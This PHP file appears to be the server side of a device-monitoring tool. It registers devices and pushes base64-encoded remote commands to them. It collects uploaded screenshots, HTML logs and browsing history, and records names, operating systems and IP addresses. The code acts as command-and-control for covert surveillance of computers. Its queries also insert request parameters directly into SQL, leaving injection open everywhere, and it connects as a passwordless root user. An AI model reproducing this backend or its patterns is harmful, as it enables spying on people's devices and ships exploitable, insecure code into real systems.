<?php
include "compress.php";
header("Access-Control-Allow-Origin: *");
date_default_timezone_set("Asia/Bangkok");
$now = time();
$conn = new mysqli("localhost", "root", "", "db_arrow");
$conn->set_charset("utf8");
$conn->query("SET NAMES UTF8");
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    if (isset($_GET['deviceID'])) {
        $deviceID = strtolower($_GET['deviceID']);
		$device_handle = $conn->query("SELECT * FROM `devices` WHERE `deviceID` = '$deviceID'");
		if ($device_handle->num_rows == 1) {
			$conn->query("UPDATE `devices` SET `time` = '" . time() . "' WHERE `deviceID` = '$deviceID'");
			$device_data = $device_handle->fetch_assoc();
			if ($action == 'cf_version') {
				echo $device_data['update_time'];
			} elseif ($action == 'is_activated') {
				echo $device_data['activated'];
			} elseif ($action == 'instant_cmd_count') {
				echo $device_data['instant_cmd_count'];
			} elseif ($action == 'instant_cmd') {
				echo base64_decode($device_data['instant_cmd']);
			} elseif ($action == 'load_cf') {
				//echo strhex(rc4($deviceID . "_visor_app", $device_data['config']));
				echo $device_data['config'];
			} elseif ($action == 'check') {
				echo 1;
			} elseif ($action == 'alive') {
				$conn->query("UPDATE `devices` SET `time` = '" . time() . "' WHERE `deviceID` = '$deviceID'");
			} elseif ($action == 'config') {
				if (isset($_GET['name']) && isset($_GET['os'])) {
					$conn->query("UPDATE `devices` SET `activated`='1',`name` = '" . $_GET['name'] . "', `os`='" . $_GET['os'] . "', `ip`='" . get_client_ip() . "' WHERE `deviceID` = '$deviceID'");
				}
			} elseif ($action == 'log') {
				$type = $_GET['type'];
				if (!file_exists('logs/'.$deviceID)) {
					mkdir('logs/'.$deviceID, 0777, true);
				}
				if ($type == "screenshot") {
					$name = $now . '.jpeg';
				} elseif ($type == "log") {
					$name = $now . '.html';
				} elseif ($type == "history") {
					$name = $now . '.txt';
				}
				$name = $deviceID . "_" . $name;
				$target_path = 'logs/'.$deviceID.'/' . $name;
				if(move_uploaded_file($_FILES['userfile']['tmp_name'], $target_path)) {
					compress($target_path, $target_path, 50);
					echo "The file ".  basename( $_FILES['userfile']['name']). " uploaded";
					$conn->query('INSERT INTO `logs` (`owner`, `type`, `fname`, `time`) VALUES ("'.$deviceID.'", "'.$type.'", "'.$name.'", "'.$now.'")');
				} else{
					echo "There was an error uploading the file, please try again!";
				}
			} elseif ($action == 'is_online') {
				echo 1;
			} elseif ($action == 'update_stats') {
				if (isset($_GET['timer'])) {
					$cur_day = date('d');
					$cur_month = date('m');
					$cur_year = date('Y');
					$sel = $conn->query("SELECT * FROM `time_stats` WHERE `day` = '$cur_day' AND `month` = '$cur_month' AND `year` = '$cur_year' AND `deviceID` = '$deviceID'");
					echo "SELECT * FROM `time_stats` WHERE `day` = '$cur_day' AND `month` = '$cur_month' AND `year` = '$cur_year' AND `deviceID` = '$deviceID'";
					if ($sel->num_rows == 1) {
						$conn->query("UPDATE `time_stats` SET `timer`='".$_GET['timer']."' WHERE `day` = '$cur_day' AND `month` = '$cur_month' AND `year` = '$cur_year' AND `deviceID` = '$deviceID'");
					} else {
						$conn->query("INSERT INTO `time_stats`(`deviceID`, `timer`, `day`, `month`, `year`)
						VALUES ('$deviceID', '".$_GET['timer']."','$cur_day','$cur_month','$cur_year')");
					}
				}
			} else {
				echo 'invalid_data';
			}
		} else {
			echo 'invalid_deviceid';
		}
    } else {
        $deviceID = "";
		if ($action == 'is_online') {
			echo '1';
		} elseif ($action == 'add') {
			if (isset($_GET['verify_code'])) {
				$verify_code = $_GET['verify_code'];
				$author_query = $conn->query("SELECT * FROM `users` WHERE `verify_code` = '$verify_code'");
				if ($author_query->num_rows == 1) {
					$author_data = $author_query->fetch_assoc();
					$new_deviceID = random_string(50);
					$check_query = $conn->query("SELECT * FROM `devices` WHERE `deviceID` = '$new_deviceID'");
					while ($check_query->num_rows == 1) {
						$new_deviceID = random_string(50);
						$check_query = $conn->query("SELECT * FROM `devices` WHERE `deviceID` = '$new_deviceID'");
					}
					$new_config = array();
					$new_config['config']['email'] = $author_data['email'];
					if (isset($_GET['password'])) {
						$new_config['config']['password'] = $_GET['password'];
					}
					$new_config_json = json_encode($new_config);
					if ($conn->query("INSERT INTO `devices`(`config`, `owner`, `deviceID`, `activated`, `created_time`)
					VALUES ('$new_config_json', '".$author_data['fbid']."', '$new_deviceID', '0' ,'".time()."')")) {
						echo $new_deviceID;
					}
				} else {
					echo "0";
				}
			} else {
				echo "0";
			}
		}/* elseif ($action == 'open-case') {
			$new_deviceID = random_string(40);
			$check_query = $conn->query("SELECT * FROM `devices` WHERE `deviceID` = '$new_deviceID'");
			while ($check_query->num_rows == 1) {
				$new_deviceID = random_string(40);
				$check_query = $conn->query("SELECT * FROM `devices` WHERE `deviceID` = '$new_deviceID'");
			}
			$new_config = array();
			$new_config['config']['password'] = $_GET['password'];
			$new_config_json = json_encode($new_config);
			if ($conn->query("INSERT INTO `devices`(`config`, `owner`, `deviceID`, `activated`, `created_time`, `name`)
			VALUES ('$new_config_json', '".$author_data['fbid']."', '$new_deviceID', '0', '".time()."','".htmlentities($_GET['name'])."')")) {
				echo $new_deviceID;
			}
		}*/ elseif ($action == 'version') {
			echo '1.1.1';
		} else {
			echo 'invalid_action';
		}
    }
} else {
	echo 'invalid_action';
}

function random_string($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}
function strhex($string) {
  $hexstr = unpack('H*', $string);
  return array_shift($hexstr);
}

function compress($source, $destination, $quality) {
	$info = getimagesize($source);
	if ($info['mime'] == 'image/jpeg') 
		$image = imagecreatefromjpeg($source);
	elseif ($info['mime'] == 'image/gif') 
		$image = imagecreatefromgif($source);
	elseif ($info['mime'] == 'image/png') 
		$image = imagecreatefrompng($source);
	imagejpeg($image, $destination, $quality);
	return $destination;
}

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if (getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if (getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if (getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if (getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if (getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
?>